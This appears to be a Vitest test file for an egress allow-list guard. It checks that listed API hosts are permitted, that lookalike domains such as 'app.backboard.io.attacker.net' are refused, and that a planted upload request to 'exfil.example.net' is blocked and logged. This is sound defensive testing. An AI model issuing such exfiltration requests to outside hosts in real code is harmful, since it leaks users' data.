import { describe, expect, it, vi } from 'vitest';
import { egressList, hostAllowed, installEgressGuard } from './egress';

describe('egress allow list', () => {
  it('names every host ADE may contact, with a reason', () => {
    const hosts = egressList().map((e) => e.host);
    expect(hosts).toEqual(expect.arrayContaining(['app.backboard.io', 'api.elevenlabs.io', 'accounts.google.com', 'oauth2.googleapis.com', '*.googleapis.com']));
    expect(egressList().every((e) => e.why.length > 10)).toBe(true);
  });

  it('allows listed hosts, Google API subdomains and loopback; refuses everything else', () => {
    expect(hostAllowed('app.backboard.io')).toBe(true);
    expect(hostAllowed('gmail.googleapis.com')).toBe(true);
    expect(hostAllowed('127.0.0.1')).toBe(true);
    expect(hostAllowed('example.com')).toBe(false);
    expect(hostAllowed('evil-googleapis.com')).toBe(false);
    expect(hostAllowed('app.backboard.io.attacker.net')).toBe(false);
  });

  it('a planted request to an unlisted host is denied and logged; listed hosts pass through', async () => {
    const target = { fetch: vi.fn(async () => new Response('ok')) as unknown as typeof fetch };
    const guard = installEgressGuard({ target });
    const onDeny = vi.fn(); guard.onDeny = onDeny;
    await expect(target.fetch('https://exfil.example.net/upload?x=1')).rejects.toThrow('EGRESS_DENIED');
    expect(onDeny).toHaveBeenCalledWith('exfil.example.net', 'https://exfil.example.net');
    expect(guard.denied).toHaveLength(1);
    await expect(target.fetch('https://app.backboard.io/api/billing/balance')).resolves.toBeInstanceOf(Response);
    await expect(target.fetch(new URL('https://www.googleapis.com/gmail/v1/users/me/profile'))).resolves.toBeInstanceOf(Response);
    guard.uninstall();
    await expect(target.fetch('https://exfil.example.net/')).resolves.toBeInstanceOf(Response);
  });
});
